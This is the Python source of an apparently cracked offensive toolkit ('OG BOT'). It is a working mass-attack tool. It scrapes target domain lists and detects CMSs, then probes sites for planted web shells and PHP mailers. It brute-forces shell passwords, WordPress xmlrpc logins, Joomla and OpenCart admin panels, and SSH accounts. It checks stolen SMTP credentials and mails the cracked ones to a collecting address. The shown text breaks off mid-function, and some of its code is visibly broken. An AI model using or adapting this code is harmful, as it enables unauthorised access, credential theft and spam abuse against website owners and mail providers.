#!/usr/bin/python3
# -*- coding: utf-8 -*-
from multiprocessing.dummy import Pool
from socket import gethostbyname
from colorama import Fore, Style, init
import time
import random
import re
import sys
import os
from os import system,name,path,makedirs
import subprocess
from requests import get
import getpass
import json
from urllib3 import disable_warnings,exceptions
import smtplib
import datetime
import time
from pystyle import Colors,Colorate,Write
import paramiko
import requests.packages
# Scarletta
if not path.exists('Zesult'):
    makedirs('Zesult')


disable_warnings(exceptions.InsecureRequestWarning)
init(autoreset=True)

red = Fore.RED
cyan = Fore.CYAN
white = Fore.WHITE
green = Fore.GREEN
blue = Fore.BLUE
magenta = Fore.MAGENTA
yellow = Fore.YELLOW
dim = Style.DIM
normal = Style.NORMAL
bright = Style.BRIGHT

Headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0'}

bypass = True

if name == "nt":
    import ctypes


def clear():
    clear = 'clear' if name == 'posix' else 'cls'
    system(clear)


rando = [red, green, magenta, yellow, cyan, blue]

def gui():
    Write.Print("─══════════════════════════ቐቐ══════════════════════════─", Colors.blue_to_purple, interval=0.01)
    text = "\n\n         ██████╗  ██████╗     ██████╗  ██████╗ ████████╗\n        ██╔═══██╗██╔════╝     ██╔══██╗██╔═══██╗╚══██╔══╝\n        ██║   ██║██║  ███╗    ██████╔╝██║   ██║   ██║\n        ██║   ██║██║   ██║    ██╔══██╗██║   ██║   ██║\n        ╚██████╔╝╚██████╔╝    ██████╔╝╚██████╔╝   ██║\n         ╚═════╝  ╚═════╝     ╚═════╝  ╚═════╝    ╚═╝\n\n                   Cracked By @xSpider46\n"
    for N, line in enumerate(text.split("\n")):
        print(Colorate.Horizontal(Colors.red_to_green, line, 1))
        time.sleep(0.03)
    Write.Print("─══════════════════════════ቐቐ══════════════════════════─", Colors.blue_to_purple, interval=0.01)
    Write.Print("\n[0x1] Generated WebList From TLD\n[0x2] Generated WebList From WP Plugin\n[0x3] BOT Brute Wordpress [VerY Fuck]\n[0x4] SMTP Valid and Invalid + MultiSMTP_HOST \n[0x5] SMTP SENT Mail + MailConfig + MultiSMTP_HOST", Colors.red_to_yellow, interval=0.01)
    Write.Print("\n[0x6] Dump Domain TO IP\n[0x7] Mailer Tracker\n[0x8] Shell Tracker\n[0x9] Auto Check CMS + BrutePass Wordpress, Joomla, Opencart\n[0x10] BrutePass SSH Bot\n[0x11] CMS Checker ft Wordpress, Joomla, Opencart, Magento, PrestaShop\n[0x12] BrutePass WSO, Alfa", Colors.red_to_yellow, interval=0.01)
    Write.Print("\n─══════════════════════════ቐቐ══════════════════════════─\n", Colors.blue_to_purple, interval=0.01)
    
def gensite1():
    DoMain = input("Ex: Extra by TLD|com|uk|org|etc.. : ")
    start = input("First Page 1 : ")
    endpage = input("End Page Recommend 500-1000: ")
    for page in range(int(start), int(endpage)):
        print('{}[GRABBER] {}Page : {}'.format(yellow, white, page))
        url = "https://worldsitelink.com/domains/." + DoMain + "/" + str(page)
        cook = requests.get(url=url, headers=Headers, timeout=15).text
        if 'Domain' in cook:
            asus = re.findall('<a href="https://bestwebsiterank.com/(.*?)\/">', cook)
            cleaner = [domain for domain in asus if domain.endswith('.{}'.format(DoMain)) and not domain.endswith("/.{}".format(DoMain))]
            for xx in cleaner:
                site = xx.replace('https://bestwebsiterank.com/','')
                open(DoMain + '.txt', 'a+').write(site + "\n")
                print('{}[URL] : {}'.format(green, site))
    print("Done")
    
def gensite2():
    plugin = input('Ex : revslider : ')
    page = 0 
    while True:
        page += 1
        b = requests.get('http://pluginu.com/' + plugin + '/' + str(page), headers=Headers)
        c = re.findall('<p style="margin-bottom: 20px">(.*?)</p></a>', b.text)
        if c == '':
            print('EndPage')
            break
        else:
            for domain in c:
                print('{}[{}] : [{}]'.format(green, str(page), domain))
                open(plugin+'.txt', 'a+').write(domain+"\n")
                
def gensite3():
    start = input('First Page 1 : ')
    endpage = input('End Page Recommend 100000 : ')
    for page in range(int(start), int(endpage)):
        url = 'http://www.list.topmillion.net/domain-list-' + str(page)
        cook = requests.get(url=url, headers=Headers, timeout=15).text
        if "Website URL" in cook:
            asus = re.findall("target='_blank'>(.*?)</a></td>", cook)
            for xx in asus:
                open('DomainRanker.txt', 'a+').write(xx + "\n")
                print('{}[URL] : {}'.format(green, xx))
        else:
            print('This is EndPage')
            break
    print('{}Finished'.format(red))
    
def gensite4():
    dom = input('[Ex]TLD -> |com|uk|org|etc : ')
    page = 0
    while True:
        page += 1
        f = requests.get('http://pluginu.com/domain-zone/'+dom+'/'+str(page))
        g = re.findall('<button class="btn btn-default pull-left" type="button">\n  (.*?)</button></a>', f.text)
        if g == '':
            print('EndPage')
            break
        else:
            for domain in g:
                print('{}[{}] >> [{}]'.format(green, str(page), domain))
                open('Method2.txt', 'a+').write(domain+"\n")

def gensite5():
    start = input('First Page 1 : ')
    endpage = input('End Page Recommend 5000-100000 : ')
    for page in range(int(start), int(endpage)):
        url = 'https://www.greensiteinfo.com/recent_host/' + str(page) + '/'
        cook = requests.get(url=url, headers=Headers, timeout=15).text
        if 'Recent Checked Hosts' in cook:
            asus2 = re.findall('<li><a href = "https://www.greensiteinfo.com/search/(.*?)/" title', cook)
            for site in asus2:
                open('Recent_Hosted.txt', 'a+').write(site+"\n")
                print('{}[{}] : {}{}'.format(cyan, str(page), site, cyan))
        else:
            print("This is EndPage")
            break
    print('{}Finished'.format(red))

def CMSLitBot(domain):
    try:
        if not domain.startswith('http://'):
            domain = "http://" + domain
        htmlsource = requests.get(domain, headers=Headers,timeout=3)
        Wordpress = requests.get(domain + '/wp-includes/js/jquery/jquery-migrate.min.js', headers=Headers, timeout=3)
        Wordpress2 = requests.get(domain + '/wp-includes/ID3/license.txt', headers=Headers, timeout=3)
        Joomla = requests.get(domain + '/administrator/language/en-GB/en-GB.xml', headers=Headers, timeout=3)
        Joomla2 = requests.get(domain + '/administrator/help/en-GB/toc.json', headers=Headers, timeout=3)
        Joomla3 = requests.get(domain + '/plugins/system/debug/debug.xml', headers=Headers, timeout=3)
        if 'joomla' in htmlsource.text:
            print('[*] {}{} --> [Joomla]'.format(yellow,domain))
            open('Zesult/Joomla.txt', 'a+').write('http://'+domain+"\n")
        elif 'wordpress' in htmlsource.text or 'wp-content' in htmlsource.text:
            print('[*] {}{} --> [Wordpress]'.format(green,domain))
            open('Zesult/Wordpress.txt', 'a+').write('http://'+domain+"\n")
        elif 'jQuery Migrate' in Wordpress.text:
            print('[*] {}{} --> [Wordpress]'.format(green,domain))
            open('Zesult/Wordpress.txt', 'a+').write('http://'+domain+"\n")
        elif 'getID3' in Wordpress2.text:
            print('[*] {}{} --> [Wordpress]'.format(green,domain))
            open('Zesult/Wordpress.txt', 'a+').write('http://'+domain+"\n")
        elif 'joomla' in Joomla.text or 'Joomla!' in Joomla.text:
            print('[*] {}{} --> [Joomla]'.format(yellow,domain))
            open('Zesult/Joomla.txt', 'a+').write('http://'+domain+"\n")
        elif 'COMPONENTS_BANNERS_BANNERS' in Joomla2.text:
            print('[*] {}{} --> [Joomla]'.format(yellow,domain))
            open('Zesult/Joomla.txt', 'a+').write('http://'+domain+"\n")
        elif '<author>Joomla!' in Joomla3.text:
            print('[*] {}{} --> [Joomla]'.format(yellow,domain))
            open('Zesult/Joomla.txt', 'a+').write('http://'+domain+"\n")
        elif 'prestashop' in htmlsource.text:
            print('[*] {}{} --> [Prestahop]'.format(magenta,domain))
            open('Zesult/Prestashop.txt', 'a+').write('http://'+domain+"\n")
        elif '/index.php?route=' in htmlsource.text or 'opencart' in htmlsource.text:
            print('[*] {}{} --> [OpenCart]'.format(blue,domain))
            open('Zesult/OpenCart.txt', 'a+').write('http://'+domain+"\n")
        elif "vBulletin" in htmlsource.text or 'vbulletin' in htmlsource.text:
            print('[*] {}{} --> [vBulletin]'.format(cyan,domain))
            open('Zesult/vBulletin.txt', 'a+').write('http://'+domain+"\n")
        elif '/skin/frontend' in htmlsource.text or 'magento' in htmlsource.text:
            print('[*] {}{} --> [Magento]'.format(magenta,domain))
            open('Zesult/Magento.txt', 'a+').write('http://'+domain+"\n")
        else:
            print('[*] {}{} --> [Unknown]'.format(red, domain))
            open('Zesult/Unknown.txt', 'a+').write('http://'+domain+"\n")
    except Exception:
        print('[*] {}{} --> [Unknown]'.format(red,domain))
        open('Zesult/Unknown.txt','a+').write('http://'+domain+"\n")
def IPDumper(domain):
    try:
        ip = gethostbyname(domain)
        print('{}[URL] {} --> [IP] {}{}'.format(yellow, domain, green, ip))
        open("Zesult/DumpIP.txt", "a").write(ip+"\n")
    except Exception:
        print('{}[URL] {}{} --> [UNKNOWN]'.format(yellow, domain, red))

def Mailer_Tracker(domain):
    Leaf_Lister = ['/smtp.php', '/leaf.php', '/lf.php', '/sender.php', '/mailer.php', '/mail.php', '/leafmail.php', '/leafmailer.php', '/if.php', '/leafmailer2.8.php', '/leafmailer2.7.php', '/leafmailer2.php', '/wp-content/mailer.php', '/wp-content/mail.php', '/wp-content/leafmail.php', '/wp-content/leafmailer.php', '/wp-content/leaf.php', '/wp-content/if.php', '/wp-content/smtp.php', '/images/mailer.php', '/images/sender.php', '/images/leaf.php', '/images/mail.php', '/leaf/mailer.php', '/leaf/leafmailer.php', '/shell4.php', '/ups.php', '/ru.php', '/vuln.php', '/fw.php', '/uploader.php', '/up.php', '/edit-form.php', '/LEAF.php', '/Leaf.php', '/x.php', '/alex.php', '/new.php', '/leaf/mail.php']
    for leafx in Leaf_Lister:
        if not domain.startswith('http://'):
            hostleaf = 'http://' + domain + leafx
        else:
            hostleaf = domain + leafx
        leafsource = requests.get(hostleaf, headers=Headers, timeout=3)
        if 'Leaf PHPMailer' in leafsource.text or 'PHPMailer' in leafsource.text or 'alexusMailer' in leafsource.text:
            open('Zesult/Hosted_Mailer.txt', 'a+').write(hostleaf+'\n')
            print('{}[URL] : {} --> Congrat Mailer'.format(green, hostleaf))
        elif '<input type=password name=pass' in leafsource.text or "<input placeholder='password' type=password name=pass style='border-radius" in leafsource.text or "<input type='password'" in leafsource.text or '<input type=password' in leafsource.text:
            open('Zesult/Locked_Mailer.txt', 'a+').write(hostleaf+'\n')
            print('{}[URL] : {} --> Locked Door'.format(blue, hostleaf))
        else:
            print('{}[URL] : {}{} '.format(red, domain, red))
            
def Shell_Tracker(domain):
    shellist = open('Config/SheKlist.txt', encoding='utf-8').read().splitlines()
    for xshell in shellist:
        if not domain.startswith('http://'):
            hostshell = 'http://' + domain + xshell
        else:
            hostshell = domain + xshell
        shellsource = requests.get(hostshell, headers=Headers, timeout=3)
        if '>public_html' in shellsource.text or '<span>Upload file:' in shellsource.text or 'type="submit" id="_upl" value="Upload">' in shellsource.text or 'button type="submit" name="upload" class="btn btn-secondary btn-block bg-transparent mt-3" id="load"' in shellsource.text:
            open('Zesult/Hosted_Shell.txt', 'a+').write(hostshell + '\n')
            print('{}[URL] : {} --> Congrat Shell'.format(green, hostshell))
        elif '<input type=password name=pass' in shellsource.text or '<input type="password" name="pass"' in shellsource.text or "<input placeholder='password' type=password name=pass style='border-radius" in shellsource.text or '<input type=password' in shellsource.text or "<input type='password'" in shellsource.text:
            open('Zesult/Locked_Shell.txt', 'a+').write(hostshell+"\n")
            print('{}[URL] : {} --> Locked Door'.format(blue,hostshell))
        else:
            print('{}[URL] : {}{} '.format(red,domain,red))

def Brute_Mailer(domain):
    xsser = requests.session()
    cracklist = open('Config/CrackLists.txt', encoding="utf-8").read().splitlines()
    for passcrack in cracklist:
        if not domain.startswith('http://'):
            hostshell = 'http://' + domain
        else:
            hostshell = domain
        data = {'pass': passcrack}
        SentPost = xsser.post(hostshell,headers=Headers,data=data,timeout=4)
        if 'method=post>Password:' in SentPost.text or 'type=password name=pass' in SentPost.text:
            print('{}[Cracking Password] {}{} '.format(red,passcrack,red))
        else:
            print('{}[Cracked Mailer] {}{} Saved !!'.format(yellow,green,passcrack))
            open("Zesult/Cracked_Mailer.txt", 'a+').write(hostshell + '|Password|' + passcrack + "\n")
            break
        
def Brute_Shell(domain):
    xsser = requests.session()
    cracklist = open('Config/CrackLists.txt', encoding="utf-8").read().splitlines()
    for passcrack in cracklist:
        if not domain.startswith('http://'):
            hostshell = 'http://' + domain
        else:
            hostshell = domain
        data = {'pass': passcrack}
        SentPost = xsser.post(hostshell,headers=Headers,data=data,timeout=4)
        if 'method=post>Password:' in SentPost.text or 'type=password name=pass' in SentPost.text:
            print('{}[Cracking Password] {}{} '.format(red,passcrack,red))
        else:
            print('{}[Cracked Shell] {}{} Saved !! '.format(yellow,green,passcrack))
            open('Zesult/Cracked_Shells.txt', 'a+').write(hostshell + '|Password|' + passcrack + "\n")
            break    

attempts = 0

def BruteSSHBot(host):
    global attempts
    password_list = open('Config/SSHPass.txt', 'r').read().splitlines()
    userssh_list = open('Config/SSHUser.txt', 'r').read().splitlines()
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        for sshpasswd in password_list:
            for userssh in userssh_list:
                try:
                    client.connect(hostname=host, username=userssh, password=sshpasswd, timeout=2, auth_timeout=2)
                    response = client.get_transport()
                    if response.is_active():
                        print('{}[Bruting SSH] {}{}|{}{}| {} ACCESS LOGIN NSA ... LOL !!'.format(yellow, green, host, userssh, sshpasswd))
                        with open('Zesult/Cracked_SSH.txt', 'a+') as f:
                            f.write('HOST:' + host + '|' + userssh + '|' + sshpasswd)
                        client.close()
                        attempts += 1
                        break
                except Exception as E:
                    print('{}[Bruting SSH] {}{}|{}{}|{} Error : {}'.format(yellow, red, host, red, userssh, sshpasswd, str(E)))
                    attempts += 1
                    continue
    except:
        pass
            
userAgent = ['Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:78.0) Gecko/20100101 Firefox/78.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.81 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:101.0) Gecko/20100101 Firefox/101.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36 OPR/84.0.4316.14', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.81 Safari/537.36', 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/103.0.5060.63 Mobile/15E148 Safari/604.1', 'Mozilla/5.0 (iPad; CPU OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/103.0.5060.63 Mobile/15E148 Safari/604.1', 'Mozilla/5.0 (X11; CrOS x86_64 14816.131.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36', 'Mozilla/5.0 (X11; CrOS x86_64 14695.107.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0', 'Mozilla/5.0 (Windows NT 10.0; rv:103.0 ) Gecko/20100101 Firefox/103.0', 'Mozilla/5.0 (Linux; Android 10; S40Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0']

def Auto_Brute(domain):
    try:
        if domain.startswith('http://'):
            domain = domain.replace('http://','')
        if domain.startswith('https://'):
            domain = domain.replace('https://','')
        htmlsource = requests.get('http://'+domain, headers=Headers, timeout=3)
        Wordpress = requests.get('http://'+domain + '/wp-includes/js/jquery/jquery-migrate.min.js', headers={'User-Agent': random.choice(userAgent)}, timeout=3)
        Wordpress2 = requests.get('http://'+domain + '/wp-includes/ID3/license.txt', headers={'User-Agent': random.choice(userAgent)}, timeout=3)
        Joomla = requests.get('http://'+domain + '/administrator/language/en-GB/en-GB.xml', headers={'User-Agent': random.choice(userAgent)}, timeout=3)
        Joomla2 = requests.get('http://'+domain + '/administrator/help/en-GB/toc.json', headers={'User-Agent': random.choice(userAgent)}, timeout=3)
        Joomla3 = requests.get('http://'+domain + '/plugins/system/debug/debug.xml', headers={'User-Agent': random.choice(userAgent)}, timeout=3)
        if 'joomla' in htmlsource.text:
            Joom_Brute('http://'+domain)
            open('Zesult/Joomla.txt','a+').write('http://'+domain+"\n")
        elif 'wordpress' in htmlsource.text:
            StrBrute_WP('http://'+domain)
            open('Zesult/Wordpress.txt','a+').write('http://'+domain+"\n")
        elif 'jQuery Migrate' in Wordpress.text:
            StrBrute_WP('http://'+domain)
            open('Zesult/Wordpress.txt','a+').write('http://'+domain+"\n")
        elif 'getID3' in Wordpress2.text:
            StrBrute_WP('http://'+domain)
            open('Zesult/Wordpress.txt','a+').write('http://'+domain+"\n")
        elif 'joomla' in Joomla.text or 'Joomla!' in Joomla.text:
            Joom_Brute('http://'+domain)
            open('Zesult/Joomla.txt','a+').write('http://'+domain+"\n")
        elif 'COMPONENTS_BANNERS_BANNERS' in Joomla2.text:
            Joom_Brute('http://'+domain)
            open('Zesult/Joomla.txt','a+').write('http://'+domain+"\n")
        elif '<author>Joomla!' in Joomla3.text:
            Joom_Brute('http://'+domain)
            open('Zesult/Joomla.txt','a+').write('http://'+domain+"\n")
        elif '/index.php?route=' in htmlsource.text or 'opencart' in htmlsource.text:
            Joom_Brute('http://'+domain)
            open('Zesult/OpenCart.txt','a+').write('http://'+domain+"\n")
        else:
            print('[*] {}{} --> [Unknown]'.format(red,domain))
            open('Zesult/Unknown.txt','a+').write('http://'+domain+"\n")
    except Exception:
        print('[*] {}{} --> [Unknown]'.format(red,domain))
        open('Zesult/Unknown.txt','a+').write('http://'+domain+"\n")
def UserName_Enumeration(domain):
    if domain.startswith('http://'):
        domain = domain.replace('http://','')
    elif domain.startswith('https://'):
        domain = domain.replace('https://','')
    users = []
    sess = requests.session()
    for i in range(10):
        GETSource = sess.get('http://'+domain+'/?author={}'.format(str(i)), headers={'User-Agent': random.choice(userAgent)}, timeout=10)
        find = re.findall('/author/(.*)/"', str(GETSource.text))
        username = find[0]
        if '/feed' in str(username):
            find = re.findall('/author/(.*)/feed/"', GETSource.text)
            username2 = find[0]
            users.append(username2)
            users.append(username)
    if len(users) == 0:
        for i in range(10):
            GETSource2 =sess.get('http://'+domain+'/wp-json/wp/v2/users/'+str(i), headers={'User-Agent': random.choice(userAgent)}, timeout=10)
            __InFo = json.loads(str(GETSource2.text))
            if 'id' in str(__InFo):
                users.append(str(__InFo.get('slug')))
            else:
                continue
    if len(users) == 0:
        users.append('admin')
    return users

def StrBrute_WP(domain):
    sess = requests.session()
    wpusernames = UserName_Enumeration(domain=domain)
    wpasswords = open('Config/passwords.txt', encoding="utf-8").read().splitlines()
    for wpuser in wpusernames:
        for wpasswd in wpasswords:
            try:
                payload = '<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>\n                    {}</value></param><param><value>{}</value></param></params></methodCall>'.format(wpuser, wpasswd)
                fire = '{}===>'.format(cyan)
                x = sess.post('{}/xmlrpc.php'.format(domain), headers={'User-Agent': random.choice(userAgent)}, data=payload, timeout=15, verify=False)
                if 'isAdmin' in str(x.text):
                    if 'isAdmin' in str(x.content):
                        print('[[WordPress]]   {}{} {} {}[ {}|{} ]{}'.format(red,domain,fire,cyan,wpuser,wpasswd,white))
                        print('[[WordPress Successfu!!]]   {}{} {} {}[ {}|{} ]{}'.format(green,domain,fire,green,wpuser,wpasswd,white))
                        open('Zesult/Panelogin_WodPress.txt','a+').write('{}#{}@{}\n'.format(domain,wpuser,wpasswd))
                    else:
                        print('[[WordPress]]   {}{} {} {}[ {}|{} ]{}'.format(red,domain,fire,yellow,wpuser,wpasswd,white))
                else:
                    print('[[WordPress]]   {}{} {} {}[ {}|{} ]{}'.format(red,domain,fire,yellow,wpuser,wpasswd,white))
            except Exception:
                print('[[WordPress]]   {}{} {} {}[ Domain Down !!]{}'.format(red,domain,fire,yellow,white))
                return False

def ONEBRUTE_WP(domain):
    sess = requests.session()
    if not domain.startswith('http://'):
        WP_LOGIN = 'http://' + domain
    else:
        WP_LOGIN = domain
    wpusernames = UserName_Enumeration(domain=domain)
    wpasswords = open('Config/passwords.txt', encoding="utf-8").read().splitlines()
    for wpuser in wpusernames:
        for wpasswd in wpasswords:
            try:
                payload = '<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>\n                    {}</value></param><param><value>{}</value></param></params></methodCall>'.format(wpuser, wpasswd)
                fire = '{}===>'.format(cyan)
                x = sess.post('{}/xmlrpc.php'.format(domain), headers={'User-Agent': random.choice(userAgent)}, data=payload, timeout=15, verify=False)
                if 'isAdmin' in str(x.text):
                    if 'isAdmin' in str(x.content):
                        print('[[WordPress]]   {}{} {} {}[ {}|{} ]{}'.format(red,domain,fire,cyan,wpuser,wpasswd,white))
                        print('[[WordPress Successfu!!]]   {}{} {} {}[ {}|{} ]{}'.format(green,domain,fire,green,wpuser,wpasswd,white))
                        open('Zesult/Panelogin_WodPress.txt','a+').write('{}#{}@{}\n'.format(domain,wpuser,wpasswd))
                    else:
                        print('[[WordPress]]   {}{} {} {}[ {}|{} ]{}'.format(red,domain,fire,yellow,wpuser,wpasswd,white))
                else:
                    print('[[WordPress]]   {}{} {} {}[ {}|{} ]{}'.format(red,domain,fire,yellow,wpuser,wpasswd,white))
            except Exception:
                print('[[WordPress]]   {}{} {} {}[ Domain Down !!]{}'.format(red,domain,fire,yellow,white))
                return False

def Joom_Brute(domain):
    try:
        fire = '{}===>'.format(cyan)
        sess = requests.session()
        JoomUrl = 'http://' + domain + '/administrator/index.php'
        JoomScan = sess.get(JoomUrl, timeout=7, headers={'User-Agent': random.choice(userAgent)})
        JoomToken = re.findall('type="hidden" name="(.*)" value="1"', str(JoomScan.text))[0]
        JoomOption = re.findall('type="hidden" name="option" value="(.*)"', str(JoomScan.content))[0]
        JoomReturn = re.findall('<input type="hidden" name="return" value="(.*)"/>', str(JoomScan.content))[0] if re.findall('<input type="hidden" name="return" value="(.*)"/>', str(JoomScan.content)) else ''
        JoomToken = '' if JoomReturn else JoomToken
        JoomOption = 'com_login' if JoomReturn else JoomOption

        Joomuser = open('Config/JoomUser.txt', 'utf-8').read().splitlines()
        Joompasswd = open('Config/Joompasswd.txt', 'utf-8').read().splitlines()

        for users in Joomuser:
            for passwd in Joompasswd:
                post = {}
                if JoomReturn != '':
                    post['return'] = JoomReturn
                post['username'] = users
                post['passwd'] = passwd
                post['lang'] = 'en-GB'
                post['option'] = JoomOption
                post['task'] = 'login'
                post[JoomToken] = '1'
                JoomData = post
                JoomKiller = sess.post(JoomUrl, data=JoomData, headers={'User-Agent': random.choice(userAgent)}, timeout=7)
                
                if 'logout' in str(JoomKiller.text):
                    if 'user.edit' not in str(JoomKiller.text):
                        if 'index.php?option=com_installer' in str(JoomKiller.text):
                            if 'index.php?option=com_users' in str(JoomKiller.text):
                                if 'An error has occurred.' in str(JoomKiller.text):
                                    print("[[Joomla]]   {}{} {} {}[ {}|{} ]{}".format(domain, fire, red, users, passwd, white))
                                elif '404 Component not found.' in str(JoomKiller.text):
                                    print("[[Joomla]]   {}{} {} {}[ {}|{} ]{}".format(domain, fire, red, users, passwd, white))
                                else:
                                    print("[[Joomla Successfu!!]]   {}{} {} {}[ {}|{} ]{}".format(domain, fire, green, users, passwd, white))
                                    with open('Zesult/Panelogin_Joomla.txt', 'a+') as f:
                                        f.write('{}#{}@{}\n'.format(JoomUrl, users, passwd))
                                break
                else:
                    print("[[Joomla]]   {}{} {} {}[ Domain Down !!]{}".format(domain, fire, red, users, white))
    except Exception:
        pass
    
def Open_Brute(domain):
    fire = "{}===>".format(cyan)
    UserCarts = open('Config/OpenCartUsers.txt', 'utf-8').read().splitlines()
    CartPass = open('Config/passwords.txt', 'utf-8').read().splitlines()
    sess = requests.session()
    for Usercart in UserCarts:
        for cartpasswd in CartPass:
            try:
                BruteCart = "http://" + domain + "/opencart/admin/index.php"
                DataXcat = {
                    'username': Usercart,
                    'password': cartpasswd,
                    'submit': 'passwd'
                }
                XCart = sess.post(BruteCart, data=DataXcat, headers={
                    'User-Agent': random.choice(userAgent)
                }, timeout=7)
                if 'route=common/dashboard' in XCart.text or 'common/logout' in XCart.text or 'user_token=' in XCart.text:
                    print("[[OpenCart Successfu!!]]   {}{} {} {}[ {}|{} ]{}".format(green,domain,fire,green,Usercart,cartpasswd,white))
                    with open('Zesult/Panelogin_OpenCart.txt', 'a+') as f:
                        f.write("{}#{}@{}\n".format(BruteCart, Usercart, cartpasswd))
                else:
                    print("[[Opencart]]   {}{} {} {}[ {}|{} ]{}".format(red,domain,fire,yellow,Usercart,cartpasswd,white))
            except Exception:
                continue
    
SMTPValid = 0
SMTPInvalid = 0
SMTPConfig = open('Config/SMTPHost.txt', 'r').read().splitlines()
PORT = '587'
ThreadOrder = '40'

def SMTPValider(ComboAcc):
    global SMTPValid,SMTPInvalid
    for HOST in SMTPConfig:
        HOST = HOST
        PORT = int(PORT)
        SMTPAccount = ComboAcc.split(':')
        smtpuser = SMTPAccount[0]
        smtpass = SMTPAccount[1]
        try:
            server = smtplib.SMTP(HOST, PORT)
            server.ehlo()
            server.starttls()
            server.login(smtpuser, smtpass)

            SMTPValid += 1
            if sys.platform == "win32":
                ctypes.windll.kernel32.SetConsoleTitleW('[+] SMTPValided --> {} [-] SMTPInValided --> {}'.format(SMTPValid, SMTPInvalid))
            
            print(Colorate.Horizontal(Colors.yellow_to_green, '[[ SMTP WAS Valided ]] ══─ {}|{}:{}'.format(HOST, smtpuser, smtpass)))
            with open('Zesult/SMTPValided.txt', 'a+') as f:
                f.write(HOST + "|" + str(PORT) + "|" + ComboAcc + "\n")
        except:
            with open('Zesult/SMTPInvalided.txt', 'a+') as f:
                f.write(HOST + "|" + str(PORT) + "|" + ComboAcc + "\n")
            
            SMTPInvalid += 1
            print(Colorate.Color(Colors.red, '[[ Cant SMTP Inbox ]] ══─ {}|{}:{}'.format(HOST, smtpuser, smtpass)))
            if sys.platform == "win32":
                ctypes.windll.kernel32.SetConsoleTitleW('[+] SMTPValided --> {} [-] SMTPInValided --> {}'.format(SMTPValid, SMTPInvalid))

email = open('Config/MailConfig.txt', 'r').read().splitlines()

def SMTP_Cracker(ComboAcc):
    global SMTPValid,SMTPInvalid,SMTPConfig,PORT
    for HOST in SMTPConfig:
        SMTPAccount = ComboAcc.split(':')
        smtpuser = SMTPAccount[0]
        smtpass = SMTPAccount[1]
        try:
            mailserver = smtplib.SMTP(mailserver, int(PORT))
            mailserver.ehlo()
            mailserver.login(smtpuser, smtpass)
            subj = 'Cracked SMTP OG-Botv3'
            date = datetime.datetime.now().strftime('%d/%m/%Y %H:%M')
            if "@" not in smtpuser:
                froma = smtpuser + '@Smtp-OGTester.com'
            else:
                froma = smtpuser
            from_addr = froma
            to_addr = str(email)
            message_text = 'Cracked by OG Bot v3 \n[#] SMTP_Email : {}\n[#] SMTP_PASS : {}\n[#] SMTP_HOST : {}\n[#] SMTP_PORT : {}\n[#] METHOD_1 : SMTP_HTTP\n'.format(smtpuser, smtpass, HOST, str(PORT))
            msg = 'From: %s\nTo: %s\nSubject: %s\nDate: %s\n\n%s' % (from_addr, to_addr, subj, date, message_text)
            mailserver.sendmail(from_addr, to_addr, msg)
            mailserver.quit()
            print(Colorate.Horizontal(Colors.yellow_to_green, "[[ SMTP Send Inbox #METHOD_1 ]] ══─ " + HOST + "|" + smtpuser + ":" + smtpass), 1)
            open('Zesult/Inbox_ResultSMTP.txt', 'a+').write(HOST+"|"+str(PORT)+"|"+ComboAcc+"\n")
            SMTPValid += 1
            if sys.platform == "win32":
                ctypes.windll.kernel32.SetConsoleTitleW( '   [$] SMTP_Valid -==> {}   [!] SMTP_InValid -==> {}'.format(SMTPValid, SMTPInvalid))
        except:
            try:
                mailserver = smtplib.SMTP(HOST, int(PORT))
                mailserver.ehlo()
                mailserver.starttls()
                mailserver.login(smtpuser, smtpass)
                subj = 'Cracked SMTP OG-Botv3'
                date = datetime.datetime.now().strftime('%d/%m/%Y %H:%M')
                if "@" not in smtpuser:
                    froma = smtpuser + '@Smtp-OGTester.com'
                else:
                    froma = smtpuser
                from_addr = froma
                to_addr = str(email)
                message_text = 'Cracked by OG Bot v3 \n[#] SMTP_Email : {}\n[#] SMTP_PASS : {}\n[#] SMTP_HOST : {}\n[#] SMTP_PORT : {}\n[#] METHOD_2 : SMTP_HTTPS\n'.format(smtpuser, smtpass, HOST, str(PORT))
                msg = 'From: %s\nTo: %s\nSubject: %s\nDate: %s\n\n%s' % (from_addr, to_addr, subj, date, message_text)
